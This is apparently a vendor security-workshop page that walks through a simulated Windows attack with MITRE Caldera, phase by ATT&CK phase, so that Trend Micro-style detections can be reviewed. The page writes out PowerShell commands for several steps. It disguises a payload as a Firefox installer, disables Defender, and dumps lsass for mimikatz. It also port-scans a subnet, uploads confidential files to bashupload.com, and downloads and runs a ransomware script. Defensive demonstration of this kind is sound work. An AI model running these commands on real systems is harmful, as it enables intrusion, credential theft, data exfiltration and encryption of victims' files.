---
title: "Windows"
chapter: false
weight: 41
pre: "<b>4.1 </b>"
---


### ATT&CK Phases
#### Reconnaissance
This step was skipped because we already know the target of our attack (Windows Instances)

---
#### Resource Development
In this demo, we are going to use Mitre Caldera as our attacking tool.

CALDERA™ is a cybersecurity framework developed by MITRE that empowers cyber practitioners to save time, money, and energy through automated security assessments.

We are using Caldera as one of the tools to help us evaluate how Cloud One Workload Security and Vision One could empower companies to improve their security posture and risk management.

- Mitre Caldera - Pre-Configuration

Before you start with the attack simulation, be sure you updated the Mitre Caldera Global Configurations.
You must replace the IP Address (0.0.0.0) with the Public IP Address you are using to access the Mitre Caldera management console.

{{< youtube id="V4AxIqFGqrU" >}}

---
#### Initial Access and Execution
In this step you are going to create a malicious payload (Windows Based), packing it into an executable file (that simulates the Mozilla Firefox Installation), and then uploading it to filebin.net. The output URL will be used to drop this 0-day malware to the target Windows Computer.

You can generate the Caldera Agent manually, or copy and paste the following script on the https://ps2exe.azurewebsites.net/ website. Just make sure you replaced the $server variable with the Caldera Public IP Address. Save the file generated as Firefox.exe. 

<b>Windows Payload - Add the following code on top of the Caldera Payload</b>

- Invoke-WebRequest -Uri "https://download.mozilla.org/?product=firefox-51.0.1-SSL&os=win64&lang=en-US" -OutFile c:\firefox.exe;
- Start-Process -FilePath c:\firefox.exe -Args "/s" -Verb RunAs -Wait;

<b>After you export the file, upload it to filebin.net and take a note of the output url.</b>

References:

- PS1toEXE - https://ps2exe.azurewebsites.net/
- Online Storage - https://filebin.net/

{{< youtube id="RNCU0wbkEuk" >}}


---
#### Persistence
Using Mitre Caldera, you can deploy additional backdoors that will ensure you can keep accessing the affected computers in the future:

In our case, we can run a remote instruction on the affected Linux computer and deploy a secondary agent (bot).

{{< youtube id="ECAPmLFwiXY" >}}

---
#### Privilege Escalation
Using Mitre Caldera, you can deploy the Technique "UAC bypass registry (T1548.002) - Set a registry key to allow UAC bypass". It will help to to expand the impact of this attack and get additional permissions on the affected OS.

{{< youtube id="o-hCzQjhNLs" >}}

---
#### Defense Evasion
Using Mitre Caldera, you can deploy the Technique "Disable Windows Defender All (T1562.001) - Disable Windows Defender All".

{{< youtube id="w5pnVRvGS6k" >}}

---
#### Credential Access
Using Mitre Caldera, you can deploy the Technique "Leverage Procdump for lsass memory (T1003.001) - Dump lsass for later use with mimikatz". You may find sensitive information with this technique.

After you run the initial command, run also the following instructions (available on the Mitre Caldera "Potential Links" menu).

- PowerShell Invoke MimiKats

- Powerkatz (Staged)	

{{< youtube id="syO6uPBEhQc" >}}

---
#### Discovery
Using Mitre Caldera, you can deploy the Technique "Collect ARP details (T1018)" and "Find System Network Connections (T1049) - Find System Network Connections".

As result of the previous command, you will find active connections on the network 10.0.10.*. With this information, you can execute the following commands to find other active hosts running on the same subnet.

- Invoke-WebRequest -Uri https://raw.githubusercontent.com/BornToBeRoot/PowerShell_IPv4NetworkScanner/main/Scripts/IPv4NetworkScan.ps1 -OutFile C:\Users\Public\IPv4NetworkScan.ps1;
- powershell C:\Users\Public\IPv4NetworkScan.ps1 -IPv4Address 10.0.10.0 -Mask 255.255.255.0 -DisableDNSResolving;
- foreach ($port in 444..3390) {If (($a=Test-NetConnection 10.0.10.12 -Port $port -WarningAction SilentlyContinue).tcpTestSucceeded -eq $true){ "TCP port $port is open!"}}

{{< youtube id="lfZNiSudO5o" >}}


---
#### Lateral Movement
As a next step of this demo, we are going to do lateral movement and exfiltrate sensitive data from the 10.0.10.12 host.

Then using the Potential Links, select the technique "View remote shares (T1135)", and update it with the 10.0.10.12 IP Address.

{{< youtube id="x2drqoxbxPc" >}}

---
#### Command & Control
The target computer is already being controlled by the attacker/c&c server.

---
#### Collection
Using Mitre Caldera, you can deploy the Technique "Find files (T1005) - Locate files deemed sensitive". Using this technique you can search for sensitive date hosted on the affected computers.
 Replace the original directory with c:\confidential, and the content of the folder with *.txt.

- CMD - type c:\confidential\confidential.txt

{{< youtube id="5cW3VaHpMis" >}}

---
#### Exfiltration
Now that we have access to the secondary server, its time to exfiltrate the sensitive data we found on the confidential directory. Use the following powershell commands to exfiltrate the data to the bashupload website.

- Invoke-WebRequest -Uri https://bashupload.com/ -Method Post -ContentType multipart/form-data  -Body c:\confidential\confidential.txt
- Invoke-RestMethod -Uri https://bashupload.com/ -Method Post -InFile c:\confidential\confidential.txt -UseDefaultCredentials

{{< youtube id="PY8fKsBejy4" >}}

---
#### Impact 1 - (Fake) Ransomware
Now its time to encrypt the affected servers (Target 1).

After having the Risk Control Rule in place, you can execute the following commands.

- PS1 - powershell.exe -command Invoke-WebRequest -Uri https://github.com/andrefernandes86/demo-v1-ransomware/raw/main/download.ps1 -OutFile C:\Users\Public\Ransom.ps1;

- PS1 - powershell.exe -command C:\Users\Public\Ransom.ps1;

{{< youtube id="ESWP8knaRl4" >}}

---
## Reviewing the Detections 
Review the Vision One Portal (Risk Insights and XDR / Workbenchs and OAT) searching for the evidences of the instructions executed during this demo.

{{< youtube id="A-mIm0YG-OM" >}}
